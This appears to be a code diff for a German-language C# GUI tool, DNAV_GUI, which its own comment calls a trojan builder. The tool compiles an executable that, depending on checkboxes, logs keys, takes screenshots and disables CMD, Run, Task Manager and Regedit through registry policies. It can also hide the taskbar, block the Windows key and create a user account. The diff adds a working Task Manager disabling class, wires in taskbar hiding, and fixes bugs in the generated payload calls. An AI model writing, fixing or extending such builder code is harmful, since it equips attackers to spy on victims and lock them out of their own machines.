@@ -72,7 +72,7 @@ namespace DNAV_GUI
         {
             SaveFileDialog sfd = new SaveFileDialog();
             sfd.Filter = "Exe Datei|*.exe";
-            if(sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+            if (sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
             {
                 path = sfd.FileName;
                 pathTextBlock.Text = path;
@@ -219,7 +219,7 @@ namespace DNAV_GUI
 
         private void Window_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
         {
-            if(e.ChangedButton == MouseButton.Left)
+            if (e.ChangedButton == MouseButton.Left)
             {
                 this.DragMove();
             }
@@ -801,7 +801,7 @@ namespace DNAV_GUI
         /// <summary>
         /// Deaktiviert die Konsole
         /// </summary>
-        public static void Disbable()
+        public static void Disable()
         {
             RegistryKey cmd = Registry.CurrentUser.CreateSubKey(@""Software\Policies\Microsoft\Windows\System"");
             cmd.SetValue(""DisableCMD"", 0x00000001, RegistryValueKind.DWord);
@@ -832,70 +832,28 @@ namespace DNAV_GUI
             run.Close();/**/
         }
     }";
-            string taskmanagerCode = @"class Taskbar
+            string taskmanagerCode = @"class Taskmanager
     {
-        [DllImport(""user32.dll"")]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, SetWindowPosFlags uFlags);
-
-        [Flags]
-        private enum SetWindowPosFlags : uint
+        /// <summary>
+        /// Aktiviert den Taskmanager
+        /// </summary>
+        public static void Enable()
         {
-            SWP_ASYNCWINDOWPOS = 0x4000,
-            SWP_DEFERERASE = 0x2000,
-            SWP_DRAWFRAME = 0x0020,
-            SWP_FRAMECHANGED = 0x0020,
-            SWP_HIDEWINDOW = 0x0080,
-            SWP_NOACTIVATE = 0x0010,
-            SWP_NOCOPYBITS = 0x0100,
-            SWP_NOMOVE = 0x0002,
-            SWP_NOOWNERZORDER = 0x0200,
-            SWP_NOREDRAW = 0x0008,
-            SWP_NOREPOSITION = 0x0200,
-            SWP_NOSENDCHANGING = 0x0400,
-            SWP_NOSIZE = 0x0001,
-            SWP_NOZORDER = 0x0004,
-            SWP_SHOWWINDOW = 0x0040,
-        }
-
-        [DllImport(""user32"", EntryPoint = ""FindWindowA"", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
-        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-
-        [DllImport(""user32.dll"")]
-        private static extern IntPtr FindWindowEx(IntPtr parentHwnd, IntPtr childAfterHwnd, IntPtr className, string windowText);
-
-        [DllImport(""user32.dll"", SetLastError = true)]
-        private static extern IntPtr GetWindow(IntPtr hWnd, GetWindowCmd uCmd);
-
-        private enum GetWindowCmd : uint
-        {
-            GW_HWNDFIRST = 0,
-            GW_HWNDLAST = 1,
-            GW_HWNDNEXT = 2,
-            GW_HWNDPREV = 3,
-            GW_OWNER = 4,
-            GW_CHILD = 5,
-            GW_ENABLEDPOPUP = 6
+            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Policies\System"");
+            if(taskManagerKey.GetValue(""DisableTaskMgr"") != null)
+            {
+                taskManagerKey.DeleteValue(""DisableTaskMgr"");
+            }
         }
 
         /// <summary>
-        /// Versteckt die Taskleiste.
+        /// Deaktiviert den Taskmanager
         /// </summary>
-        public static void Hide()
+        public static void Disable()
         {
-            IntPtr TaskbarHWnd;
-            TaskbarHWnd = FindWindow(""Shell_traywnd"", """");
-            SetWindowPos(TaskbarHWnd, IntPtr.Zero, 0, 0, 0, 0, SetWindowPosFlags.SWP_HIDEWINDOW);    
-        }
-
-        /// <summary>
-        /// Zeigt die Taskleiste.
-        /// </summary>
-        public static void Show()
-        {
-            IntPtr TaskbarHWnd;
-            TaskbarHWnd = FindWindow(""Shell_traywnd"", """");
-            SetWindowPos(TaskbarHWnd, IntPtr.Zero, 0, 0, 0, 0, SetWindowPosFlags.SWP_SHOWWINDOW);
+            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Policies\System"");
+            taskManagerKey.SetValue(""DisableTaskMgr"", ""1"");
+            taskManagerKey.Close();
         }
     }";
             string windowskeyCode = @"class WindowsKey
@@ -1041,7 +999,7 @@ namespace DNAV_GUI
             if (grp != null) { grp.Invoke(""Add"", new object[] { NewUser.Path.ToString() }); }
         }
     }";
-            string taskbarCode = @"public class Taskbar
+            string taskbarCode = @"class Taskbar
     {
         [DllImport(""user32.dll"")]
         [return: MarshalAs(UnmanagedType.Bool)]
@@ -1144,7 +1102,7 @@ namespace DNAV_GUI
 
             if (microphoneCheckbox.IsChecked == true)
             {
-                
+
             }
 
             if (screenshotCheckbox.IsChecked == true)
@@ -1169,6 +1127,11 @@ namespace DNAV_GUI
                 useMicrosoftWin32 = true;
             }
 
+            if (taskbarCheckbox.IsChecked == true)
+            {
+                useSystemRuntimeInteropServices = true;
+            }
+
             if (windowskeyCheckbox.IsChecked == true)
             {
                 useMicrosoftWin32 = true;
@@ -1190,9 +1153,6 @@ namespace DNAV_GUI
             {
                 useSystemDirectoryServices = true;
             }
-
-            // TODO using Referenz einfügen
-            // Taskbar benutzt System.Runtime.InteropServices
 
             CSharpCodeProvider provider = new CSharpCodeProvider();
             CompilerParameters parameters = new CompilerParameters();
@@ -1231,8 +1191,6 @@ namespace DNAV_GUI
             code += "static void Main(){";
             code += "Console.Title = \"" + nameTextBox.Text + "\";";
 
-            // Debug:
-            code += "Console.WriteLine(\"Hallo Welt\");Console.ReadLine();";
             // Hier landet Code, welcher in den Trojaner soll.
 
             if (keyloggerCheckbox.IsChecked == true)
@@ -1278,17 +1236,22 @@ namespace DNAV_GUI
 
             if (cmdCheckbox.IsChecked == true)
             {
-                code += @"Cmd.Disbable();";
+                code += @"Cmd.Disable();";
             }
 
             if (runCheckbox.IsChecked == true)
             {
-                code += @"Run.Disbable();";
+                code += @"Run.Disable();";
             }
 
             if (taskmanagerCheckbox.IsChecked == true)
             {
                 code += @"Taskmanager.Disable();";
+            }
+
+            if (taskbarCheckbox.IsChecked == true)
+            {
+                code += @"Taskbar.Hide();";
             }
 
             if (windowskeyCheckbox.IsChecked == true)
@@ -1303,15 +1266,13 @@ namespace DNAV_GUI
 
             if (regeditCheckbox.IsChecked == true)
             {
-                code += @"RegEdit.Disable()";
+                code += @"RegEdit.Disable();";
             }
 
             if (createUserCheckbox.IsChecked == true)
             {
-                code += @"User.Create(" + createUserUsernameTextbox.Text + ", " + createUserPasswortTextbox.Password + ")";
+                code += @"User.Create(""" + createUserUsernameTextbox.Text + @""", """ + createUserPasswortTextbox.Password + @""");";
             }
-
-            // TODO Aufruf der Disable Methode der Taskbar
 
             code += "}"; // Close void Main
             code += "}"; // Close class Program
@@ -1335,7 +1296,7 @@ namespace DNAV_GUI
             {
                 code += cmdCode;
             }
-            
+
             if (runCheckbox.IsChecked == true)
             {
                 code += runCode;
@@ -1344,6 +1305,11 @@ namespace DNAV_GUI
             if (taskmanagerCheckbox.IsChecked == true)
             {
                 code += taskmanagerCode;
+            }
+
+            if (taskbarCheckbox.IsChecked == true)
+            {
+                code += taskbarCode;
             }
 
             if (windowskeyCheckbox.IsChecked == true)
